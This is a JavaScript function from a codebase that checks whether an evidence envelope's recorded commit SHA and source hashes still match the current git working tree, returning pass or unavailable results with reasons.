export function assessEvidenceDrift(envelopeOrReport, root, { git, thresholds, mode = "local" } = {}) {
  if (!envelopeOrReport || typeof envelopeOrReport !== "object") {
    return {
      ok: false,
      status: "unavailable",
      kind: "unavailable",
      pass: false,
      mode,
      reason: "evidence envelope or report is missing",
    }
  }

  const envelope = envelopeOrReport.evidenceEnvelope ?? envelopeOrReport
  const expectedSha = envelope.target_commit_sha ?? envelope.targetCommitSha ?? null
  const expectedSourceHash = envelope.source_hash ?? envelope.sourceHash ?? envelopeOrReport.sourceHash ?? null
  const expectedNormalized = envelope.normalized_source_hash ?? envelope.normalizedSourceHash ?? null

  if (!expectedSha && !expectedSourceHash) {
    return {
      ok: false,
      status: "unavailable",
      kind: "unavailable",
      pass: false,
      mode,
      reason: "evidence envelope carries no target_commit_sha or source_hash",
    }
  }

  const g = git ?? makeGit(root)
  if (!g || typeof g.isRepo !== "function" || !g.isRepo()) {
    return {
      ok: false,
      status: "unavailable",
      kind: "unavailable",
      pass: false,
      mode,
      reason: "current tree is not a git repository or git state is unavailable",
    }
  }

  const currentSha = typeof g.head === "function" ? (g.head() || null) : null
  const currentSourceHash = computeSourceHash(root, g, thresholds)
  const currentNormalized = computeNormalizedSourceHash(root, g, thresholds)

  if (expectedSha !== null && currentSha !== expectedSha) {
    return {
      ok: false,
      status: "unavailable",
      kind: "unavailable",
      pass: false,
      mode,
      reason: `target commit SHA diverged: expected ${expectedSha}, current tree is at ${currentSha}`,
      divergence: "target_commit_sha",
      expected: expectedSha,
      current: currentSha,
    }
  }

  if (expectedSourceHash !== null) {
    const exactMatch = currentSourceHash === expectedSourceHash
    const normalizedMatch = Boolean(
      expectedNormalized && currentNormalized && expectedNormalized === currentNormalized,
    )
    if (!exactMatch && !normalizedMatch) {
      return {
        ok: false,
        status: "unavailable",
        kind: "unavailable",
        pass: false,
        mode,
        reason: `source hash diverged: expected ${expectedSourceHash}, current tree hash is ${currentSourceHash}`,
        divergence: "source_hash",
        expected: expectedSourceHash,
        current: currentSourceHash,
      }
    }
  }

  return {
    ok: true,
    status: "pass",
    kind: "clean",
    pass: true,
    mode,
    target_commit_sha: currentSha,
    source_hash: currentSourceHash,
    working_tree_clean: checkWorkingTreeClean(g),
  }
}
